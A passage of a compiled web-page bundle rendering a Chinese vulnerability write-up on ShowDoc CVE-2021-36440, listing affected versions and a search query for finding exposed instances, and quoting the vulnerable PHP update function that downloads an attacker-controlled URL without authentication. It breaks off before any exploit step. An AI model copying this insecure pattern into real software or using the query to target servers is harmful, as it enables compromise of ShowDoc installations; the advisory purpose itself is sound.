(window.webpackJsonp=window.webpackJsonp||[]).push([[118],{2002:function(s,t,a){s.exports=a.p+"assets/img/1638708274023-ae45bb10-901c-483e-b3df-0a5cfd52da81.14e5a226.png"},2003:function(s,t,a){s.exports=a.p+"assets/img/1638708347572-cf80a24d-71bb-4c3c-8676-201900ffd87e.05e19417.png"},2004:function(s,t,a){s.exports=a.p+"assets/img/1638708478505-107a09b3-7d01-40a6-86ed-9a4822bda800.e3bffabe.png"},2005:function(s,t,a){s.exports=a.p+"assets/img/1638708837279-80c1936d-40d8-4687-a7ce-8da4747e5d15.42318fb7.png"},2776:function(s,t,a){"use strict";a.r(t);var n=a(75),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"showdoc-adminupdatecontroller-class-php-任意文件上传漏洞-cve-2021-36440"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#showdoc-adminupdatecontroller-class-php-任意文件上传漏洞-cve-2021-36440"}},[s._v("#")]),s._v(" ShowDoc AdminUpdateController.class.php 任意文件上传漏洞 CVE-2021-36440")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("ShowDoc AdminUpdateController.class.php 文件中的更新部分代码没有鉴权且存在任意文件上传漏洞")]),s._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("ShowDoc < V2.9.5")]),n("br"),s._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v('app="ShowDoc"')]),n("br"),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("登录页面")]),s._v(" "),n("p",[n("img",{attrs:{src:a(2002),alt:"img"}})]),s._v(" "),n("p",[s._v("文件路径"),n("code",[s._v("server/Application/Api/Controller/AdminUpdateController.class.php")])]),s._v(" "),n("p",[n("img",{attrs:{src:a(2003),alt:"img"}})]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("public")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function-definition function"}},[s._v("download")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("set_time_limit")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("ini_set")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'memory_limit'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'500M'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$new_version")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("I")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"new_version"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file_url")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("I")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"file_url"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version_num")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("str_replace")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"v"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('""')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$new_version")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"../"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n        "),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 进行文件读写权限检查")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("new_is_writeable")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("new_is_writeable")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"Sqlite/"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("new_is_writeable")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"web/"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("new_is_writeable")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"web/index.php"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("new_is_writeable")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"server/"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("new_is_writeable")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"server/vendor/autoload.php"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("new_is_writeable")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"server/Application/Api"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("sendError")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("10101")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'请手动给showdoc安装目录下的所有文件可写权限，否则程序无法覆盖旧文件'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$temp_dir")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("sys_get_temp_dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"/showdoc_update/"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$temp_dir")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'showdoc-'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version_num")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'.zip'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$temp_dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("unlink")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_get_contents")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file_url")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_put_contents")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        \n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("new")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token class-name class-name-fully-qualified"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ZipArchive")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$flag")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$flag")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!==")]),n("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("true")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("sendError")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("10101")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'下载更新压缩包失败'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("extractTo")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$temp_dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$flag")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("close")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        \n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file_subpath")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$temp_dir")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'showdoc-'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$version_num")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"/"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        \n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_exists")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file_subpath")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'composer.json'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_exists")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file_subpath")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'web/index.php'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_exists")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file_subpath")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'server/vendor/autoload.php'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//echo $zip_file_subpath.'存在';")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// 移动目录到upload/update")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("copydir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$zip_file_subpath")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$showdoc_path")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'Public/Uploads/update/'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("deldir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$temp_dir")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("sendResult")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("array")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        \n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$this")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("->")]),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("sendError")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("10101")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'下载更新压缩包后，解压的文件缺失'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br")])]),n("p",[s._v("这里可以看到 $file_url 参数可控，可在任意URl下载 